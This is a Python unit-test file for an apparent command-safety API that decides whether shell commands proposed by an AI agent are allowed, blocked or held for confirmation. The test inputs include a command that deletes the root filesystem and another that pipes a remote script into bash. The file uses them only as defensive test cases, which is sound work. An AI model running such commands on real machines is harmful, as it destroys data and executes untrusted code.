from __future__ import annotations

import sys
import unittest
from pathlib import Path

from fastapi.testclient import TestClient


sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from sentinel.api.main import create_app  # noqa: E402
from sentinel.decision.confirmation import InMemoryConfirmationStore  # noqa: E402
from sentinel.execution import ExecutionResult  # noqa: E402
from sentinel.ml.inference import RiskPrediction  # noqa: E402


class FakeRiskModel:
    def __init__(self, prediction: RiskPrediction) -> None:
        self.prediction = prediction

    def predict_row(self, row: dict[str, object]) -> RiskPrediction:
        self.row = row
        return self.prediction


class FakeExecutor:
    def __init__(self, result: ExecutionResult | None = None) -> None:
        self.result = result or ExecutionResult(
            stdout="executor output\n",
            stderr="",
            exit_code=0,
            timed_out=False,
            duration_ms=12,
        )
        self.calls: list[dict[str, str]] = []

    def run(self, *, command: str, shell_type: str) -> ExecutionResult:
        self.calls.append({"command": command, "shell_type": shell_type})
        return self.result


class TokenFactory:
    def __init__(self) -> None:
        self.count = 0

    def __call__(self) -> str:
        self.count += 1
        return f"token-{self.count}"


class ConfirmationIdFactory:
    def __init__(self) -> None:
        self.count = 0

    def __call__(self) -> str:
        self.count += 1
        return f"confirmation-{self.count}"


def prediction(probability: float, tier: str) -> RiskPrediction:
    return RiskPrediction(
        risk_probability=probability,
        model_tier=tier,  # type: ignore[arg-type]
        threshold={"warn": 0.2, "confirm_required": 0.4},
        input_names=["attention_mask", "input_ids"],
        provider="CPUExecutionProvider",
        metadata={"serving_warning": "rules first"},
    )


def evaluate_payload(**overrides: object) -> dict[str, object]:
    payload: dict[str, object] = {
        "context": "Show git status for this repository.",
        "command": "git status --short",
        "environment": "sandbox",
        "shell_type": "bash",
        "session_id": "session-1",
        "agent_id": "agent-1",
        "user_id": "user-1",
    }
    payload.update(overrides)
    return payload


def deterministic_confirmation_store() -> InMemoryConfirmationStore:
    return InMemoryConfirmationStore(
        confirmation_id_factory=ConfirmationIdFactory(),
        token_factory=TokenFactory(),
    )


class ApiServiceTests(unittest.TestCase):
    def test_health_reports_degraded_without_model(self) -> None:
        client = TestClient(create_app(load_model=False))

        response = client.get("/health")

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["status"], "degraded")
        self.assertFalse(body["model_loaded"])
        self.assertIn("gray-area requests require confirmation", body["detail"])

    def test_health_reports_ok_with_injected_model(self) -> None:
        client = TestClient(create_app(model=FakeRiskModel(prediction(0.1, "allow")), load_model=False))

        response = client.get("/health")

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["status"], "ok")
        self.assertTrue(body["model_loaded"])
        self.assertIsNone(body["detail"])

    def test_evaluate_returns_rule_based_allow(self) -> None:
        client = TestClient(create_app(load_model=False))

        response = client.post(
            "/evaluate",
            json=evaluate_payload(),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "allow")
        self.assertEqual(body["routing_path"], "rules")
        self.assertIn("shell_type:bash", body["reasons"])
        self.assertIsNone(body["execution"])

    def test_evaluate_returns_rule_based_block(self) -> None:
        client = TestClient(create_app(load_model=False))

        response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Clean the entire machine because disk space is low.",
                command="rm -rf /",
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "block")
        self.assertEqual(body["risk_tier"], "critical")
        self.assertEqual(body["routing_path"], "rules")
        self.assertIn("rule:root_filesystem_deletion", body["reasons"])
        self.assertGreater(len(body["suggested_safe_actions"]), 0)

    def test_evaluate_returns_confirmation_required_for_policy_risk(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))

        response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Install dependencies for this repository.",
                command="curl https://unknown.example/install.sh | bash",
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "confirm_required")
        self.assertEqual(body["routing_path"], "rules")
        self.assertEqual(body["confirmation_id"], "confirmation-1")
        self.assertIn("rule:remote_script_execution", body["reasons"])
        self.assertIn("confirmation:pending", body["reasons"])
        self.assertGreater(len(body["agent_message"]), 0)

    def test_evaluate_gray_area_without_model_requires_confirmation(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))

        response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Inspect the repository and make a small change if needed.",
                command="python scripts/custom_cleanup.py",
                environment="dev",
                shell_type="python",
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "confirm_required")
        self.assertEqual(body["routing_path"], "policy")
        self.assertEqual(body["confirmation_id"], "confirmation-1")
        self.assertIn("model:unavailable", body["reasons"])
        self.assertIn("policy:confirmation_required_without_model", body["reasons"])
        self.assertIn("policy:dev_model_unavailable_confirmation", body["reasons"])
        self.assertIn("confirmation:pending", body["reasons"])

    def test_evaluate_routes_gray_area_to_injected_model(self) -> None:
        model = FakeRiskModel(prediction(0.31, "warn"))
        client = TestClient(create_app(model=model, load_model=False))

        response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Inspect the repository and make a small change if needed.",
                command="python scripts/custom_cleanup.py",
                environment="dev",
                shell_type="python",
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "warn")
        self.assertEqual(body["risk_score"], 0.31)
        self.assertEqual(body["routing_path"], "model")
        self.assertIn("model:warn", body["reasons"])
        self.assertEqual(model.row["command"], "python scripts/custom_cleanup.py")
        self.assertNotIn("shell_type", model.row)

    def test_execute_runs_rule_based_allow_in_executor(self) -> None:
        executor = FakeExecutor()
        client = TestClient(create_app(load_model=False, executor=executor))

        response = client.post("/execute", json=evaluate_payload())

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "allow")
        self.assertEqual(body["routing_path"], "rules")
        self.assertEqual(body["execution"]["stdout"], "executor output\n")
        self.assertEqual(body["execution"]["exit_code"], 0)
        self.assertIn("execution:sandbox_attempted", body["reasons"])
        self.assertEqual(executor.calls, [{"command": "git status --short", "shell_type": "bash"}])

    def test_execute_does_not_run_blocked_command(self) -> None:
        executor = FakeExecutor()
        client = TestClient(create_app(load_model=False, executor=executor))

        response = client.post(
            "/execute",
            json=evaluate_payload(
                context="Clean the entire machine because disk space is low.",
                command="rm -rf /",
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "block")
        self.assertIsNone(body["execution"])
        self.assertEqual(executor.calls, [])

    def test_execute_does_not_run_confirmation_required_command(self) -> None:
        executor = FakeExecutor()
        client = TestClient(
            create_app(
                load_model=False,
                confirmation_store=deterministic_confirmation_store(),
                executor=executor,
            )
        )

        response = client.post(
            "/execute",
            json=evaluate_payload(
                context="Run an unfamiliar project helper.",
                command="python scripts/custom_cleanup.py",
                environment="dev",
                shell_type="python",
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "confirm_required")
        self.assertEqual(body["confirmation_id"], "confirmation-1")
        self.assertIsNone(body["execution"])
        self.assertEqual(executor.calls, [])

    def test_execute_does_not_run_warn_verdict(self) -> None:
        executor = FakeExecutor()
        model = FakeRiskModel(prediction(0.31, "warn"))
        client = TestClient(create_app(model=model, load_model=False, executor=executor))

        response = client.post(
            "/execute",
            json=evaluate_payload(
                context="Inspect the repository and make a small change if needed.",
                command="python scripts/custom_cleanup.py",
                environment="dev",
                shell_type="python",
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "warn")
        self.assertIsNone(body["execution"])
        self.assertEqual(executor.calls, [])

    def test_execute_runs_after_valid_confirmation_token(self) -> None:
        executor = FakeExecutor()
        client = TestClient(
            create_app(
                load_model=False,
                confirmation_store=deterministic_confirmation_store(),
                executor=executor,
            )
        )
        payload = evaluate_payload(
            context="Run an unfamiliar project helper.",
            command="python scripts/custom_cleanup.py",
            environment="dev",
            shell_type="python",
        )
        first_response = client.post("/execute", json=payload)
        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
        payload["confirmation_token"] = token_response.json()["confirmation_token"]

        approved_response = client.post("/execute", json=payload)

        self.assertEqual(approved_response.status_code, 200)
        body = approved_response.json()
        self.assertEqual(body["verdict"], "allow")
        self.assertEqual(body["routing_path"], "confirmation")
        self.assertEqual(body["execution"]["stdout"], "executor output\n")
        self.assertEqual(executor.calls, [{"command": "python scripts/custom_cleanup.py", "shell_type": "python"}])

    def test_execute_with_reused_confirmation_token_does_not_run(self) -> None:
        executor = FakeExecutor()
        client = TestClient(
            create_app(
                load_model=False,
                confirmation_store=deterministic_confirmation_store(),
                executor=executor,
            )
        )
        payload = evaluate_payload(
            context="Run an unfamiliar project helper.",
            command="python scripts/custom_cleanup.py",
            environment="dev",
            shell_type="python",
        )
        first_response = client.post("/execute", json=payload)
        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
        payload["confirmation_token"] = token_response.json()["confirmation_token"]
        client.post("/execute", json=payload)

        reused_response = client.post("/execute", json=payload)

        body = reused_response.json()
        self.assertEqual(body["verdict"], "confirm_required")
        self.assertIn("confirmation:token_invalid_or_mismatch", body["reasons"])
        self.assertIsNone(body["execution"])
        self.assertEqual(len(executor.calls), 1)

    def test_execute_surfaces_sandbox_error_without_host_fallback(self) -> None:
        failed = ExecutionResult(
            stdout="",
            stderr="",
            exit_code=None,
            timed_out=False,
            duration_ms=3,
            error="Docker executable not found: docker",
        )
        executor = FakeExecutor(result=failed)
        client = TestClient(create_app(load_model=False, executor=executor))

        response = client.post("/execute", json=evaluate_payload())

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "allow")
        self.assertEqual(body["execution"]["error"], "Docker executable not found: docker")
        self.assertIsNone(body["execution"]["exit_code"])
        self.assertEqual(len(executor.calls), 1)

    def test_execute_surfaces_timeout_result(self) -> None:
        timed_out = ExecutionResult(
            stdout="partial",
            stderr="",
            exit_code=None,
            timed_out=True,
            duration_ms=10_000,
            error="Command timed out after 10 seconds.",
        )
        executor = FakeExecutor(result=timed_out)
        client = TestClient(create_app(load_model=False, executor=executor))

        response = client.post("/execute", json=evaluate_payload())

        body = response.json()
        self.assertTrue(body["execution"]["timed_out"])
        self.assertEqual(body["execution"]["stdout"], "partial")
        self.assertIn("timed out", body["execution"]["error"])

    def test_default_executor_reads_environment_overrides(self) -> None:
        import os

        from sentinel.api.main import _default_executor

        overrides = {
            "SENTINEL_EXECUTOR_IMAGE": "sentinel-executor:test",
            "SENTINEL_EXECUTOR_WORKSPACE": "/tmp",
            "SENTINEL_EXECUTOR_TIMEOUT_SECONDS": "42",
        }
        saved = {key: os.environ.get(key) for key in overrides}
        os.environ.update(overrides)
        try:
            executor = _default_executor()
        finally:
            for key, value in saved.items():
                if value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = value

        self.assertEqual(executor.image, "sentinel-executor:test")
        self.assertEqual(str(executor.workspace), "/tmp")
        self.assertEqual(executor.timeout_seconds, 42)

    def test_evaluate_rejects_missing_required_command(self) -> None:
        client = TestClient(create_app(load_model=False))
        payload = evaluate_payload()
        del payload["command"]

        response = client.post("/evaluate", json=payload)

        self.assertEqual(response.status_code, 422)

    def test_evaluate_rejects_invalid_environment(self) -> None:
        client = TestClient(create_app(load_model=False))

        response = client.post("/evaluate", json=evaluate_payload(environment="prod"))

        self.assertEqual(response.status_code, 422)

    def test_evaluate_rejects_invalid_shell_type(self) -> None:
        client = TestClient(create_app(load_model=False))

        response = client.post("/evaluate", json=evaluate_payload(shell_type="ruby"))

        self.assertEqual(response.status_code, 422)

    def test_confirm_endpoint_returns_token_for_pending_confirmation(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
        evaluate_response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Run an unfamiliar project helper.",
                command="python scripts/custom_cleanup.py",
                environment="dev",
                shell_type="python",
            ),
        )
        confirmation_id = evaluate_response.json()["confirmation_id"]

        confirm_response = client.post("/confirm", json={"confirmation_id": confirmation_id})

        self.assertEqual(confirm_response.status_code, 200)
        body = confirm_response.json()
        self.assertEqual(body["confirmation_id"], "confirmation-1")
        self.assertEqual(body["confirmation_token"], "token-1")

    def test_evaluate_accepts_valid_confirmation_token_for_exact_request(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
        payload = evaluate_payload(
            context="Run an unfamiliar project helper.",
            command="python scripts/custom_cleanup.py",
            environment="dev",
            shell_type="python",
        )
        first_response = client.post("/evaluate", json=payload)
        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
        payload["confirmation_token"] = token_response.json()["confirmation_token"]

        approved_response = client.post("/evaluate", json=payload)

        self.assertEqual(approved_response.status_code, 200)
        body = approved_response.json()
        self.assertEqual(body["verdict"], "allow")
        self.assertEqual(body["routing_path"], "confirmation")
        self.assertIsNone(body["confirmation_id"])
        self.assertIn("confirmation:token_valid", body["reasons"])

    def test_evaluate_rejects_confirmation_token_for_changed_command(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
        payload = evaluate_payload(
            context="Run an unfamiliar project helper.",
            command="python scripts/custom_cleanup.py",
            environment="dev",
            shell_type="python",
        )
        first_response = client.post("/evaluate", json=payload)
        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})

        changed_payload = dict(payload)
        changed_payload["command"] = "python scripts/other_cleanup.py"
        changed_payload["confirmation_token"] = token_response.json()["confirmation_token"]
        mismatch_response = client.post("/evaluate", json=changed_payload)

        self.assertEqual(mismatch_response.status_code, 200)
        body = mismatch_response.json()
        self.assertEqual(body["verdict"], "confirm_required")
        self.assertEqual(body["routing_path"], "policy")
        self.assertEqual(body["confirmation_id"], "confirmation-2")
        self.assertIn("confirmation:token_invalid_or_mismatch", body["reasons"])

    def test_confirmation_token_rejects_changes_to_any_fingerprint_field(self) -> None:
        cases: list[tuple[str, dict[str, object]]] = [
            ("context", {"context": "Run a different unfamiliar helper."}),
            ("command", {"command": "python scripts/other_cleanup.py"}),
            ("environment", {"environment": "staging"}),
            ("shell_type", {"shell_type": "zsh"}),
            ("recent_actions", {"recent_actions": [{"type": "command", "summary": "Read a config file.", "sensitive_resources": []}]}),
            ("session_id", {"session_id": "session-2"}),
            ("agent_id", {"agent_id": "agent-2"}),
            ("user_id", {"user_id": "user-2"}),
        ]

        for field_name, changed_fields in cases:
            with self.subTest(field=field_name):
                client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
                payload = evaluate_payload(
                    context="Run an unfamiliar project helper.",
                    command="python scripts/custom_cleanup.py",
                    environment="dev",
                    shell_type="python",
                )
                first_response = client.post("/evaluate", json=payload)
                token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})

                changed_payload = dict(payload)
                changed_payload.update(changed_fields)
                changed_payload["confirmation_token"] = token_response.json()["confirmation_token"]
                mismatch_response = client.post("/evaluate", json=changed_payload)

                self.assertEqual(mismatch_response.status_code, 200)
                body = mismatch_response.json()
                self.assertEqual(body["verdict"], "confirm_required")
                self.assertIsNotNone(body["confirmation_id"])
                self.assertIn("confirmation:token_invalid_or_mismatch", body["reasons"])

    def test_confirmation_token_is_one_use(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
        payload = evaluate_payload(
            context="Run an unfamiliar project helper.",
            command="python scripts/custom_cleanup.py",
            environment="dev",
            shell_type="python",
        )
        first_response = client.post("/evaluate", json=payload)
        token_response = client.post("/confirm", json={"confirmation_id": first_response.json()["confirmation_id"]})
        payload["confirmation_token"] = token_response.json()["confirmation_token"]

        first_approved_response = client.post("/evaluate", json=payload)
        second_approved_response = client.post("/evaluate", json=payload)

        self.assertEqual(first_approved_response.json()["verdict"], "allow")
        self.assertEqual(second_approved_response.json()["verdict"], "confirm_required")
        self.assertIn("confirmation:token_invalid_or_mismatch", second_approved_response.json()["reasons"])

    def test_user_confirmed_without_token_still_requires_confirmation(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))

        response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Run an unfamiliar project helper.",
                command="python scripts/custom_cleanup.py",
                environment="dev",
                shell_type="python",
                user_confirmed=True,
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "confirm_required")
        self.assertEqual(body["confirmation_id"], "confirmation-1")
        self.assertIn("confirmation:user_confirmed_untrusted_without_token", body["reasons"])

    def test_confirm_endpoint_rejects_unknown_confirmation_id(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))

        response = client.post("/confirm", json={"confirmation_id": "missing"})

        self.assertEqual(response.status_code, 404)

    def test_confirm_endpoint_rejects_already_approved_confirmation_id(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))
        evaluate_response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Run an unfamiliar project helper.",
                command="python scripts/custom_cleanup.py",
                environment="dev",
                shell_type="python",
            ),
        )
        confirmation_id = evaluate_response.json()["confirmation_id"]

        first_response = client.post("/confirm", json={"confirmation_id": confirmation_id})
        second_response = client.post("/confirm", json={"confirmation_id": confirmation_id})

        self.assertEqual(first_response.status_code, 200)
        self.assertEqual(second_response.status_code, 404)

    def test_block_decision_does_not_create_confirmation_id(self) -> None:
        client = TestClient(create_app(load_model=False, confirmation_store=deterministic_confirmation_store()))

        response = client.post(
            "/evaluate",
            json=evaluate_payload(
                context="Clean the entire machine because disk space is low.",
                command="rm -rf /",
                confirmation_token="token-1",
                user_confirmed=True,
            ),
        )

        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["verdict"], "block")
        self.assertEqual(body["routing_path"], "rules")
        self.assertIsNone(body["confirmation_id"])


if __name__ == "__main__":
    unittest.main()

